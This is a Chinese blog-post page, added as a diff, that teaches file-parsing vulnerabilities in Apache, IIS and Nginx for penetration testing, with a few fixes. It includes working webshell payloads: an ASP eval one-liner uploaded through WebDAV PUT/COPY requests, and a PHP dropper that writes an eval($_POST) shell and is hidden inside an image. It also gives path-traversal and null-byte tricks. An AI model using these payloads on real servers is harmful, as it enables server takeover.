@@ -1,0 +1,1298 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="Web Server解析漏洞, 江南小虫虫的博客">
+    <meta name="description" content="1. Apache解析漏洞1.1. 未知后缀解析漏洞1.1.1. 影响版本
+Apache 1.x
+Apache 2.x
+
+1.1.2. 原理
+Apache对于⽂件名的解析是从后往前解析的, 直到遇⻅⼀个Apache认识的⽂件类型为⽌.
+比如">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Web Server解析漏洞 | 江南小虫虫的博客</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <script src="/libs/jquery/jquery.min.js"></script>
+    
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper head-container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">江南小虫虫的博客</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/biaobai/表白.html" class="waves-effect waves-light">
+      
+      <i class="fas fa-heart" style="zoom: 0.6;"></i>
+      
+      <span>给亲爱的老婆仔</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">江南小虫虫的博客</div>
+        <div class="logo-desc">
+            
+            尽力就行~~~
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/biaobai/表白.html" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-heart"></i>
+			
+			给亲爱的老婆仔
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Web Server解析漏洞</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Apache解析漏洞/">
+                                <span class="chip bg-color">Apache解析漏洞</span>
+                            </a>
+                        
+                            <a href="/tags/IIS解析漏洞/">
+                                <span class="chip bg-color">IIS解析漏洞</span>
+                            </a>
+                        
+                            <a href="/tags/Nginx解析漏洞/">
+                                <span class="chip bg-color">Nginx解析漏洞</span>
+                            </a>
+                        
+                            <a href="/tags/PHP-CGI路径解析问题/">
+                                <span class="chip bg-color">PHP CGI路径解析问题</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/渗透测试/" class="post-category">
+                                渗透测试
+                            </a>
+                        
+                            <a href="/categories/渗透测试/文件上传/" class="post-category">
+                                文件上传
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-04-27
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2019-11-30
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    8 分
+                </div>
+                
+				
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+            
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="1-Apache解析漏洞"><a href="#1-Apache解析漏洞" class="headerlink" title="1. Apache解析漏洞"></a>1. Apache解析漏洞</h2><h3 id="1-1-未知后缀解析漏洞"><a href="#1-1-未知后缀解析漏洞" class="headerlink" title="1.1. 未知后缀解析漏洞"></a>1.1. 未知后缀解析漏洞</h3><h4 id="1-1-1-影响版本"><a href="#1-1-1-影响版本" class="headerlink" title="1.1.1. 影响版本"></a>1.1.1. 影响版本</h4><ul>
+<li><code>Apache 1.x</code></li>
+<li><code>Apache 2.x</code></li>
+</ul>
+<h4 id="1-1-2-原理"><a href="#1-1-2-原理" class="headerlink" title="1.1.2. 原理"></a>1.1.2. 原理</h4><ul>
+<li>Apache对于⽂件名的解析是<strong>从后往前解析</strong>的, 直到遇⻅⼀个Apache认识的⽂件类型为⽌.</li>
+<li>比如一个文件名为<code>xxx.x1.x2.x3</code>的文件, Apache会从<code>x3</code>的位置往<code>x1</code>的位置开始尝试解析, 如果<code>x3</code>不属于Apache能解析的扩展名, 那么Apache会尝试去解析<code>x2</code>的位置, 这样<strong>一直从后往前尝试, 直到遇到一个能解析的扩展名为止, 如果都不认识,则会暴露其源代码</strong>.</li>
+<li>具体来说, 例如：<code>Phpshell.php.abc.abc</code>, 因为Apache不认识<code>.abc</code>这个⽂件类型，所以会⼀直遍历后缀到<code>.php</code>, 然后认为这是⼀个PHP类型的⽂件.<a id="more"></a></li>
+<li>那么Apache认识哪些扩展名呢?<ul>
+<li>windows: 在Apache安装目录下<code>/conf/mime.types</code>文件中有详细的扩展名列表,这种方法可以绕过基于黑名单的检查</li>
+<li>Ubuntu: 在<code>/etc/mime.types</code>文件中</li>
+</ul>
+</li>
+</ul>
+<h4 id="1-1-3-利用"><a href="#1-1-3-利用" class="headerlink" title="1.1.3. 利用"></a>1.1.3. 利用</h4><ul>
+<li>⽐如<code>.rar</code>是⼀个合法的上传需求, 在应⽤⾥只判断⽂件的后缀是否是<code>.rar</code>, 最终⽤户上传的是<code>phpshell.php.rar.rar.rar</code>, 从⽽导致脚本被执⾏.</li>
+</ul>
+<h3 id="1-2-换行解析漏洞"><a href="#1-2-换行解析漏洞" class="headerlink" title="1.2. 换行解析漏洞"></a>1.2. 换行解析漏洞</h3><h4 id="1-2-1-影响版本"><a href="#1-2-1-影响版本" class="headerlink" title="1.2.1. 影响版本"></a>1.2.1. 影响版本</h4><ul>
+<li>Apache版本在<code>2.4.0</code>到<code>2.4.29</code></li>
+</ul>
+<h4 id="1-2-2-原理"><a href="#1-2-2-原理" class="headerlink" title="1.2.2. 原理"></a>1.2.2. 原理</h4><ul>
+<li>正则中, <code>$</code>可以匹配行尾或者一个<code>换行符</code></li>
+<li>如果目标Apache使用如下方法来禁止某目录执行PHP</li>
+</ul>
+<pre><code>&lt;FilesMatch &quot;\.(?i:php|php3|php4)$&quot;&gt;
+Order allow, deny
+Deny from all
+&lt;/FilesMatch&gt;</code></pre><ul>
+<li>我们可以上传一个后缀末尾包含换行符的php文件, 来绕过这个<code>FilesMatch</code></li>
+</ul>
+<blockquote>
+<p>默认的Apache配置就可以利用, 默认的Apache配置就使用了如下的<code>FilesMatch</code></p>
+</blockquote>
+<pre><code>&lt;FilesMatch \.php$&gt;
+    SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;</code></pre><h4 id="1-2-3-利用"><a href="#1-2-3-利用" class="headerlink" title="1.2.3. 利用"></a>1.2.3. 利用</h4><ul>
+<li>上传一个包含webshell的php文件, 如文件名是<code>1.php</code>, 然后用bp抓包, 用hex功能在<code>1.php</code>后面添加一个<code>\x0A</code></li>
+</ul>
+<p><img src="_v_images/20190427220220641_716208242.png" alt></p>
+<ul>
+<li>然后访问<code>1.php%0A</code>, 即可发现getshell</li>
+</ul>
+<h2 id="2-IIS解析漏洞"><a href="#2-IIS解析漏洞" class="headerlink" title="2. IIS解析漏洞"></a>2. IIS解析漏洞</h2><h3 id="2-1-IIS6-0"><a href="#2-1-IIS6-0" class="headerlink" title="2.1. IIS6.0"></a>2.1. IIS6.0</h3><ul>
+<li><code>IIS 6.0</code>再解析文件的时候存在以下三个解析漏洞：</li>
+</ul>
+<ol>
+<li>当<strong>文件</strong>为<code>*.asp;1.jpg</code>时,<code>IIS 6.0</code>会以<code>ASP脚本</code>来执行</li>
+<li>当建立<code>*.asa</code>,<code>*.asp</code>格式的<strong>文件夹</strong>时,其目录下的任意文件都将被IIS当作<code>asp</code>文件来解析</li>
+<li><code>WebDav(Web-based Distributed Authoring and Versioning)</code>漏洞(对IIS写权限的利用),如果服务器开启<code>WebDav</code>,并且支持<code>PUT</code>,<code>Move</code>,<code>Copy</code>,<code>Delete</code>等方法,就可能存在安全隐患</li>
+</ol>
+<h4 id="2-1-1-文件类型"><a href="#2-1-1-文件类型" class="headerlink" title="2.1.1. 文件类型"></a>2.1.1. 文件类型</h4><p>Ⅰ:正常：<code>www.xxx.com/logo.jpg</code></p>
+<p>Ⅱ:触发漏洞：<code>www.xxx.com/logo.asp;abc.jpg</code></p>
+<ul>
+<li>这类似0x00字符截断⽂件名, 不过截断字符变成了分号<code>;</code></li>
+<li>按照Ⅰ来上传访问<code>logo.jpg</code>，文件会被当成是jpg图片来解析，如果上传访问<code>logo.asp;abc.jpg</code>，IIS 6会将此⽂件解析为<code>logo.asp</code>，⽂件名被截断了, <strong>被当成<code>asp</code>文件来处理, 从⽽导致脚本被执⾏</strong>, 而不会去管<code>abc.jpg</code>(如果IIS支持PHP，那么<code>logo.php;abc.jpg</code>也会被当成<code>PHP</code>文件执行）</li>
+</ul>
+<h4 id="2-1-2-文件夹类型"><a href="#2-1-2-文件夹类型" class="headerlink" title="2.1.2. 文件夹类型"></a>2.1.2. 文件夹类型</h4><p>Ⅰ:正常：<code>www.xxx.com/image/logo.jpg</code></p>
+<p>Ⅱ:触发漏洞：<code>www.xxx.com/image.asp/logo.jpg</code></p>
+<ul>
+<li>按照Ⅰ来上传访问<code>logo.jpg</code>，文件会被当成是<code>jpg</code>图片来解析，如果将<code>logo.jpg</code>上传到<code>*.asp</code>如<code>image.asp</code>目录下，<strong>文件就会被当成<code>asp</code>文件来处理</strong>。（如果IIS支持PHP，那么<code>image.php文件夹</code>下的文件也会被当做<code>PHP</code>文件解析。）</li>
+</ul>
+<h4 id="2-1-3-WebDav"><a href="#2-1-3-WebDav" class="headerlink" title="2.1.3. WebDav"></a>2.1.3. WebDav</h4><h5 id="2-1-3-1-利用条件"><a href="#2-1-3-1-利用条件" class="headerlink" title="2.1.3.1. 利用条件"></a>2.1.3.1. 利用条件</h5><ol>
+<li>目录支持写权限</li>
+<li>开启了WebDav</li>
+<li>勾选了<code>脚本资源访问</code>复选框</li>
+</ol>
+<blockquote>
+<p>攻击者常用<code>PUT</code>方法上传危险脚本文件, 然后用<code>move</code>方法改为脚本文件, 从而执行webshell, 测试步骤如下:</p>
+</blockquote>
+<h5 id="2-1-3-2-通过OPTIONS探测服务器所支持的HTTP方法"><a href="#2-1-3-2-通过OPTIONS探测服务器所支持的HTTP方法" class="headerlink" title="2.1.3.2. 通过OPTIONS探测服务器所支持的HTTP方法"></a>2.1.3.2. 通过<code>OPTIONS</code>探测服务器所支持的HTTP方法</h5><pre><code>请求：
+OPTIONS / HTTP/1.1
+Host:www.example.com
+
+响应：
+。。。
+Allow:OPTIONS,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE,MKCOL,PROPFIND,PROPPATCH,LOCK,UNLOCK,SEARCH
+。。。</code></pre><h5 id="2-1-3-3-通过PUT方法向服务器上传脚本文件"><a href="#2-1-3-3-通过PUT方法向服务器上传脚本文件" class="headerlink" title="2.1.3.3. 通过PUT方法向服务器上传脚本文件"></a>2.1.3.3. 通过<code>PUT</code>方法向服务器上传脚本文件</h5><pre><code>请求：
+PUT /a.txt HTTP/1.1
+Host:www.example.com
+Content-Length:30
+
+&lt;%eval request(&quot;chopper&quot;)%&gt;</code></pre><h5 id="2-1-3-4-通过Move或Copy方法改名"><a href="#2-1-3-4-通过Move或Copy方法改名" class="headerlink" title="2.1.3.4. 通过Move或Copy方法改名"></a>2.1.3.4. 通过<code>Move</code>或<code>Copy</code>方法改名</h5><pre><code>请求：
+COPY /a.txt HTTP/1.1
+Host:www.example.com
+Destination:http://www.example.com/cmd.asp</code></pre><h5 id="2-1-3-5-使用DELETE方法，攻击者还可以删除服务器上的任意文件"><a href="#2-1-3-5-使用DELETE方法，攻击者还可以删除服务器上的任意文件" class="headerlink" title="2.1.3.5. 使用DELETE方法，攻击者还可以删除服务器上的任意文件"></a>2.1.3.5. 使用<code>DELETE</code>方法，攻击者还可以删除服务器上的任意文件</h5><pre><code>请求：
+DELETE /a.txt HTTP/1.1
+Host:www.example.com</code></pre><blockquote>
+<p>桂林老兵曾写过一款针对WebDav漏洞的软件:<code>IIS Write</code>,利用这款软件,可以快速探测服务器是否存在WebDav漏洞</p>
+</blockquote>
+<h3 id="2-2-IIS7-0以上"><a href="#2-2-IIS7-0以上" class="headerlink" title="2.2. IIS7.0以上"></a>2.2. IIS7.0以上</h3><h4 id="2-2-1-影响版本"><a href="#2-2-1-影响版本" class="headerlink" title="2.2.1. 影响版本"></a>2.2.1. 影响版本</h4><pre><code>IIS7.0(Win2008R1+IIS7.0)
+IIS7.5(Win2008R2+IIS7.5)</code></pre><h4 id="2-2-2-原理"><a href="#2-2-2-原理" class="headerlink" title="2.2.2. 原理"></a>2.2.2. 原理</h4><ul>
+<li><p><code>IIS7.0/7.5</code>是对<code>php解析</code>时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL后面追加上字符串”<code>/任意文件名.php</code>”就<strong>会按照<code>php</code>的方式去解析</strong>。（例如：<code>webshell.jpg/x.php</code>）</p>
+</li>
+<li><p>IIS的解析漏洞不像Apache那么模糊，针对IIS6.0，只要文件名不被重命名基本都能搞定。这里要注意一点，对于”<code>任意文件名/任意文件名.php</code>”这个漏洞其实是出现自<code>php-cgi</code>的漏洞， 所以其实跟IIS自身是无关的。</p>
+</li>
+</ul>
+<h4 id="2-2-3-利用"><a href="#2-2-3-利用" class="headerlink" title="2.2.3. 利用"></a>2.2.3. 利用</h4><ul>
+<li>将shell语句，如  </li>
+</ul>
+<pre><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></pre><p>写在文本<code>xx.txt</code>中(或者shell语句直接写一句话，用菜刀、cknife等直连，只是容易被查杀），然后用命令将shell语句附加在正常图片<code>xx.jpg</code>后</p>
+<pre><code>copy xx.jpg/b + xx.txt/a test.jpg</code></pre><ul>
+<li>上传<code>test.jpg</code>，然后访问<code>test.jpg/.php</code>或<code>test.jpg/abc.php</code>当前目录下就会生成一句话木马 <code>shell.php</code></li>
+</ul>
+<h2 id="3-Nginx解析漏洞"><a href="#3-Nginx解析漏洞" class="headerlink" title="3. Nginx解析漏洞"></a>3. Nginx解析漏洞</h2><h3 id="3-1-畸形解析漏洞"><a href="#3-1-畸形解析漏洞" class="headerlink" title="3.1. 畸形解析漏洞"></a>3.1. 畸形解析漏洞</h3><h4 id="3-1-1-原理"><a href="#3-1-1-原理" class="headerlink" title="3.1.1. 原理"></a>3.1.1. 原理</h4><ul>
+<li>对任意文件名，在后面添加”<code>/任意文件名.php</code>”的解析漏洞，比如图片木马文件名是<code>test.jpg</code>，可以添加为<code>test.jpg/x.php</code>进行<strong>解析攻击</strong>,那么<code>test.jpg</code>会被当成PHP脚本来解析。注意,此时的<code>x.php</code>是不存在的</li>
+<li>这种解析漏洞其实是<code>PHP CGI</code>漏洞,在PHP配置文件中有个关键的选项:<code>cgi.fix_pathinfo</code>,这个选项在某些版本中是默认开启的</li>
+</ul>
+<pre><code>cgi.fix_pathinfo = 1</code></pre><ul>
+<li>在开启时访问URL,比如: <code>http://www.xxser.com/x.txt/x.php</code>,<code>x.php</code>是不存在的文件,所以<strong>PHP会<code>向前递归</code>解析</strong>,于是造成了解析漏洞.由于Nginx和PHP配合很容易造成这种漏洞,所以,PHP CGI漏洞常常被认为是Nginx解析漏洞,所以其实跟Nginx自身是无关的。</li>
+</ul>
+<h4 id="3-1-2-利用"><a href="#3-1-2-利用" class="headerlink" title="3.1.2. 利用"></a>3.1.2. 利用</h4><ul>
+<li><p>将shell语句，如  </p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?PHP</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'shell.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'&lt;?php eval($_POST[cmd])?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre>
+<p>写在文本<code>xx.txt</code>中(或者shell语句直接写一句话，用菜刀、cknife等直连，只是容易被查杀）</p>
+</li>
+<li><p>然后用命令将shell语句附加在正常图片<code>xx.jpg</code>后</p>
+</li>
+</ul>
+<pre><code>copy xx.jpg/b + xx.txt/a test.jpg</code></pre><ul>
+<li>上传<code>test.jpg</code>，然后访问<code>test.jpg/.php</code>或<code>test.jpg/abc.php</code>,当前目录下就会生成一句话木马 <code>shell.php</code></li>
+</ul>
+<h4 id="3-1-3-修复"><a href="#3-1-3-修复" class="headerlink" title="3.1.3. 修复"></a>3.1.3. 修复</h4><ul>
+<li>将<code>cgi.fix_pathinfo</code> 设置为0</li>
+</ul>
+<h3 id="3-2-空字节代码执行漏洞"><a href="#3-2-空字节代码执行漏洞" class="headerlink" title="3.2. 空字节代码执行漏洞"></a>3.2. 空字节代码执行漏洞</h3><h4 id="3-2-1-原理"><a href="#3-2-1-原理" class="headerlink" title="3.2.1. 原理"></a>3.2.1. 原理</h4><ul>
+<li>低版本的Nginx可以在任意文件名后面添加<code>%00.php</code>进行<strong>解析攻击</strong>。</li>
+</ul>
+<pre><code>Nginx0.5.
+Nginx0.6.
+Nginx0.7. &lt;= 0.7.65
+Nginx0.8. &lt;= 0.8.37</code></pre><h4 id="3-2-2-利用"><a href="#3-2-2-利用" class="headerlink" title="3.2.2. 利用"></a>3.2.2. 利用</h4><ul>
+<li>比如在图片后附加php代码,然后通过访问<pre><code>xx.jpg%00.php</code></pre>来执行其中的代码</li>
+</ul>
+<h3 id="3-3-文件名逻辑漏洞-CVE-2013-4547"><a href="#3-3-文件名逻辑漏洞-CVE-2013-4547" class="headerlink" title="3.3. 文件名逻辑漏洞(CVE-2013-4547)"></a>3.3. 文件名逻辑漏洞(CVE-2013-4547)</h3><ul>
+<li>受影响的nginx版本: 0.8.41至1.4.3和1.5.7之前的1.5.x</li>
+<li>正常上传一个附加代码的图片<code>test.jpg</code>，访问时后面+<code>空格</code>+<code>\\0</code>+<code>.php</code>，即让图片作为php文件解析</li>
+</ul>
+<pre><code>&quot;/test.jpg \\0.php&quot;</code></pre><h3 id="3-4-配置不当目录穿越"><a href="#3-4-配置不当目录穿越" class="headerlink" title="3.4. 配置不当目录穿越"></a>3.4. 配置不当目录穿越</h3><ul>
+<li>如果绝对路径<code>/home/</code>的URL映射是网站目录<code>/files/</code>，配置写成了<code>/files</code></li>
+</ul>
+<pre><code>location /files {
+    alias /home/;
+}</code></pre><ul>
+<li>就可以访问<code>/files../</code>，穿越路径，访问到绝对路径根目录<code>/</code>下的文件列表</li>
+</ul>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://www.fengwenhua.top" rel="external nofollow noreferrer">冯文华</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://www.fengwenhua.top/2019/04/28/web-server-jie-xi-lou-dong/">https://www.fengwenhua.top/2019/04/28/web-server-jie-xi-lou-dong/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://www.fengwenhua.top" target="_blank">冯文华</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Apache解析漏洞/">
+                                    <span class="chip bg-color">Apache解析漏洞</span>
+                                </a>
+                            
+                                <a href="/tags/IIS解析漏洞/">
+                                    <span class="chip bg-color">IIS解析漏洞</span>
+                                </a>
+                            
+                                <a href="/tags/Nginx解析漏洞/">
+                                    <span class="chip bg-color">Nginx解析漏洞</span>
+                                </a>
+                            
+                                <a href="/tags/PHP-CGI路径解析问题/">
+                                    <span class="chip bg-color">PHP CGI路径解析问题</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
